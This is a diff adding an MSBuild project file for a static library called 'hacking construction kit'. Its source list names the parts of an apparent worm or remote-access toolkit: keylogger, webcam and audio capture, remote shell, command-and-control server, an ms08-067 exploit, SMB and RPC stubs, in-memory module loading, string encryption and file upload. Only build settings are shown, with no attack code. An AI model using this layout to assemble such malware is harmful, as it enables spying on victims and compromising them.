@@ -1,0 +1,206 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<Project DefaultTargets="Build" ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <ItemGroup Label="ProjectConfigurations">
+    <ProjectConfiguration Include="Debug|Win32">
+      <Configuration>Debug</Configuration>
+      <Platform>Win32</Platform>
+    </ProjectConfiguration>
+    <ProjectConfiguration Include="Release|Win32">
+      <Configuration>Release</Configuration>
+      <Platform>Win32</Platform>
+    </ProjectConfiguration>
+  </ItemGroup>
+  <PropertyGroup Label="Globals">
+    <ProjectGuid>{FC7B127D-2C0E-4273-91A5-4CF797FC3E2D}</ProjectGuid>
+    <RootNamespace>hackingconstructionkit</RootNamespace>
+  </PropertyGroup>
+  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="Configuration">
+    <ConfigurationType>StaticLibrary</ConfigurationType>
+    <UseDebugLibraries>true</UseDebugLibraries>
+    <CharacterSet>MultiByte</CharacterSet>
+    <UseOfMfc>false</UseOfMfc>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="Configuration">
+    <ConfigurationType>StaticLibrary</ConfigurationType>
+    <UseDebugLibraries>false</UseDebugLibraries>
+    <WholeProgramOptimization>true</WholeProgramOptimization>
+    <CharacterSet>MultiByte</CharacterSet>
+  </PropertyGroup>
+  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
+  <ImportGroup Label="ExtensionSettings">
+  </ImportGroup>
+  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
+    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
+  </ImportGroup>
+  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
+    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
+  </ImportGroup>
+  <PropertyGroup Label="UserMacros" />
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
+    <CustomBuildBeforeTargets>
+    </CustomBuildBeforeTargets>
+  </PropertyGroup>
+  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
+    <ClCompile>
+      <WarningLevel>Level3</WarningLevel>
+      <Optimization>Disabled</Optimization>
+      <AdditionalIncludeDirectories>lib\zlib;%(AdditionalIncludeDirectories)</AdditionalIncludeDirectories>
+      <RuntimeLibrary>MultiThreadedDebug</RuntimeLibrary>
+      <PreprocessorDefinitions>_CRT_SECURE_NO_WARNINGS;_SCL_SECURE_NO_WARNINGS;LOG;%(PreprocessorDefinitions)</PreprocessorDefinitions>
+      <MultiProcessorCompilation>true</MultiProcessorCompilation>
+      <MinimalRebuild>false</MinimalRebuild>
+    </ClCompile>
+    <Link>
+      <GenerateDebugInformation>true</GenerateDebugInformation>
+      <AdditionalLibraryDirectories>F:\dev\projets\worms\hacking construction kit\jpeg-8\lib\win\x86;%(AdditionalLibraryDirectories)</AdditionalLibraryDirectories>
+    </Link>
+    <Lib>
+      <IgnoreSpecificDefaultLibraries>%(IgnoreSpecificDefaultLibraries)</IgnoreSpecificDefaultLibraries>
+      <LinkTimeCodeGeneration>true</LinkTimeCodeGeneration>
+    </Lib>
+    <CustomBuildStep>
+      <Command>
+      </Command>
+    </CustomBuildStep>
+    <PreBuildEvent>
+      <Command>python ../encode_string.py</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Message>Encode strings</Message>
+    </PreBuildEvent>
+  </ItemDefinitionGroup>
+  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
+    <ClCompile>
+      <WarningLevel>Level3</WarningLevel>
+      <Optimization>MaxSpeed</Optimization>
+      <FunctionLevelLinking>true</FunctionLevelLinking>
+      <IntrinsicFunctions>true</IntrinsicFunctions>
+      <AdditionalIncludeDirectories>lib\zlib;%(AdditionalIncludeDirectories)</AdditionalIncludeDirectories>
+      <RuntimeLibrary>MultiThreaded</RuntimeLibrary>
+      <PreprocessorDefinitions>_CRT_SECURE_NO_WARNINGS;_SCL_SECURE_NO_WARNINGS;%(PreprocessorDefinitions)</PreprocessorDefinitions>
+    </ClCompile>
+    <Link>
+      <GenerateDebugInformation>true</GenerateDebugInformation>
+      <EnableCOMDATFolding>true</EnableCOMDATFolding>
+      <OptimizeReferences>true</OptimizeReferences>
+    </Link>
+    <Lib />
+    <Lib>
+      <AdditionalDependencies>%(AdditionalDependencies)</AdditionalDependencies>
+    </Lib>
+  </ItemDefinitionGroup>
+  <ItemGroup>
+    <ClCompile Include="base64.cpp" />
+    <ClCompile Include="bmp2jpeg.c" />
+    <ClCompile Include="check.cpp" />
+    <ClCompile Include="command_manager.cpp" />
+    <ClCompile Include="crypted_global.cpp" />
+    <ClCompile Include="ccrypter.cpp" />
+    <ClCompile Include="cshell.cpp" />
+    <ClCompile Include="c_c_server.cpp" />
+    <ClCompile Include="decoder.cpp" />
+    <ClCompile Include="extern\BigInt.cpp" />
+    <ClCompile Include="extern\Key.cpp" />
+    <ClCompile Include="extern\KeyPair.cpp" />
+    <ClCompile Include="extern\MemoryModule.c" />
+    <ClCompile Include="extern\PrimeGenerator.cpp" />
+    <ClCompile Include="extern\RSA.cpp" />
+    <ClCompile Include="file.cpp" />
+    <ClCompile Include="finger_print.cpp" />
+    <ClCompile Include="ftp.cpp" />
+    <ClCompile Include="generated\spoolss_c.c" />
+    <ClCompile Include="generated\spoolss_s.c" />
+    <ClCompile Include="generated\srvsvc_c.c" />
+    <ClCompile Include="generated\srvsvc_s.c" />
+    <ClCompile Include="global.cpp" />
+    <ClCompile Include="http_helper.cpp" />
+    <ClCompile Include="Icmp.cpp" />
+    <ClCompile Include="info.cpp" />
+    <ClCompile Include="keylogger.cpp" />
+    <ClCompile Include="mem.cpp" />
+    <ClCompile Include="ms08-067.cpp" />
+    <ClCompile Include="network.cpp" />
+    <ClCompile Include="payload.cpp" />
+    <ClCompile Include="plugin.cpp" />
+    <ClCompile Include="print.cpp" />
+    <ClCompile Include="cprocess.cpp" />
+    <ClCompile Include="random.cpp" />
+    <ClCompile Include="rc4.cpp" />
+    <ClCompile Include="register.cpp" />
+    <ClCompile Include="screen.cpp" />
+    <ClCompile Include="service.cpp" />
+    <ClCompile Include="smb.cpp" />
+    <ClCompile Include="sound_recorder.cpp" />
+    <ClCompile Include="spy.cpp" />
+    <ClCompile Include="tcp.cpp" />
+    <ClCompile Include="cwebcam.cpp" />
+    <ClCompile Include="to_test.cpp" />
+    <ClCompile Include="upload_file_base64.cpp" />
+    <ClCompile Include="upload_file_ftp.cpp" />
+    <ClCompile Include="utils.cpp" />
+    <ClCompile Include="wsa_init.cpp" />
+    <ClCompile Include="xwebcam.cpp" />
+    <ClCompile Include="czip.cpp" />
+  </ItemGroup>
+  <ItemGroup>
+    <ClInclude Include="base64.h" />
+    <ClInclude Include="bmp2jpeg.h" />
+    <ClInclude Include="check.h" />
+    <ClInclude Include="command_manager.h" />
+    <ClInclude Include="crypted_global.h" />
+    <ClInclude Include="ccrypter.h" />
+    <ClInclude Include="cshell.h" />
+    <ClInclude Include="cwebcam.h" />
+    <ClInclude Include="c_c_server.h" />
+    <ClInclude Include="Decoder.h" />
+    <ClInclude Include="extern\BigInt.h" />
+    <ClInclude Include="extern\Key.h" />
+    <ClInclude Include="extern\KeyPair.h" />
+    <ClInclude Include="extern\MemoryModule.h" />
+    <ClInclude Include="extern\PrimeGenerator.h" />
+    <ClInclude Include="extern\RSA.h" />
+    <ClInclude Include="file.h" />
+    <ClInclude Include="finger_print.h" />
+    <ClInclude Include="ftp.h" />
+    <ClInclude Include="generated\spoolss.h" />
+    <ClInclude Include="generated\srvsvc.h" />
+    <ClInclude Include="global.h" />
+    <ClInclude Include="http_helper.h" />
+    <ClInclude Include="Icmp.h" />
+    <ClInclude Include="info.h" />
+    <ClInclude Include="keylogger.h" />
+    <ClInclude Include="macro.h" />
+    <ClInclude Include="mem.h" />
+    <ClInclude Include="memory_debug.h" />
+    <ClInclude Include="ms08-067.h" />
+    <ClInclude Include="network.h" />
+    <ClInclude Include="payload.h" />
+    <ClInclude Include="plugin.h" />
+    <ClInclude Include="plugin_loader.h" />
+    <ClInclude Include="print.h" />
+    <ClInclude Include="cprocess.h" />
+    <ClInclude Include="random.h" />
+    <ClInclude Include="rc4.h" />
+    <ClInclude Include="register.h" />
+    <ClInclude Include="screen.h" />
+    <ClInclude Include="service.h" />
+    <ClInclude Include="smb.h" />
+    <ClInclude Include="sound_recorder.h" />
+    <ClInclude Include="spy.h" />
+    <ClInclude Include="tcp.h" />
+    <ClInclude Include="tstring.h" />
+    <ClInclude Include="upload_file_base64.h" />
+    <ClInclude Include="upload_file_ftp.h" />
+    <ClInclude Include="utils.h" />
+    <ClInclude Include="wsa_init.h" />
+    <ClInclude Include="xwebcam.h" />
+    <ClInclude Include="czip.h" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="hacking construction kit.def" />
+  </ItemGroup>
+  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
+  <ImportGroup Label="ExtensionTargets">
+  </ImportGroup>
+</Project>
